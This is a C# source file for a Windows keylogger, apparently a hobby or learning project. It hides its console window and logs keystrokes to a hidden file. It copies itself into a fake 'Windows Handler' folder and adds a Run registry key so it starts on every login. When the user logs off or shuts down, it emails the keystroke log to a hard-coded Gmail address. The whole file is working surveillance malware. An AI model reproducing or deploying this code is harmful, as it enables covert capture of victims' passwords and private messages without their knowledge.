using System;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Mail;
using Microsoft.Win32;
using System.Diagnostics;

namespace KeyLogger
{
    class Program
    {
        public static bool checkSystemEvents = false;
        public static string path = @"C:\Program Files\Windows Handler\";
        public static string filePath = @"C:\Program Files\Windows Handler\Handler.dat";

        public static string appName = Process.GetCurrentProcess().MainModule.FileName;
        public static string appExe = Path.GetFileName(appName);

        [DllImport("kerner32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        //const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            try
            {
                Program program = new Program();

                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);

                while (!File.Exists(filePath))
                {
                    if (!Directory.Exists(path))
                    {
                        DirectoryInfo di = Directory.CreateDirectory(path);
                        di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                        File.Create(filePath);
                    }
                    else if (Directory.Exists(path) && !File.Exists(filePath))
                    {
                        File.Create(filePath);
                    }
                }

                program.Spread();
                using (var writer = new StreamWriter(filePath))
                {
                    while (!checkSystemEvents)
                    {
                        Thread.Sleep(10);

                        for (int i = 0; i < 255; i++)
                        {
                            var keyState = GetAsyncKeyState(i);

                            if (keyState == 1 || keyState == -32767)
                            {
                                SystemEvents.SessionEnding += SystemEventsSessionEnding;
                                writer.WriteLine((Keys)i);
                                writer.Flush();
                                break;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                SystemEvents.SessionEnding -= SystemEventsSessionEnding;
                return;
            }
        }

        private static void SystemEventsSessionEnding(object sender, SessionEndingEventArgs e)
        {
            checkSystemEvents = true;
            var program = new Program();

            switch (e.Reason)
            {
                case SessionEndReasons.Logoff:
                    program.SendMail();
                    break;
                case SessionEndReasons.SystemShutdown:
                    program.SendMail();
                    break;
                default:
                    break;
            }
        }

        private void SendMail()
        {
            var date = DateTime.Now.ToString("dd-MM-yyyy-HH-mm");
            var user = Environment.UserName;

            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient smtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress("witviers@gmail.com");
                mail.To.Add("witviers@gmail.com");
                mail.Subject = $"Kays from {date}";
                mail.Body = $"Keystrokes saved from User: {user}";

                var attachment = new Attachment(filePath);
                mail.Attachments.Add(attachment);

                smtpServer.Port = 587;
                smtpServer.Credentials = new System.Net.NetworkCredential("witviers@gmail.com", "haslo do maila");
                smtpServer.EnableSsl = true;
                smtpServer.Send(mail);
            }
            catch (Exception ex)
            {

            }
        }

        private void Spread()
        {
            var targetPath = Path.Combine(path, appExe);
            if (!File.Exists(Path.Combine(path, appExe)))
            {
                var fileInfo = new FileInfo(appName);
                fileInfo.CopyTo(Path.Combine(path, appExe));

                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("Watcher_Client", targetPath);
            }       
        }
    }
}
